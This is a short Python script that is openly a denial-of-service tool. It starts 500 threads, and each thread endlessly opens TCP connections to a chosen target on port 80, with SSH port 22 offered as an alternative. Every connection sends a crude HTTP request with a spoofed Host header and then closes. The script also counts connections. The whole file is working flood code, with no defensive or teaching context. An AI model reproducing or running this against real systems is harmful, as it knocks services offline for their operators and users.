import threading
import socket

target = '0.0.0.0'  #IP or DNS
port = 80  #HTTP port
#port = 22 #SSH port
fake_ip = '1.1.1.1'

already_connected = 0

#Low tech method constant open and closing of the connection
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        #Prints every 500 connections
        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print(already_connected)


# amount of threads that run the attack method
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()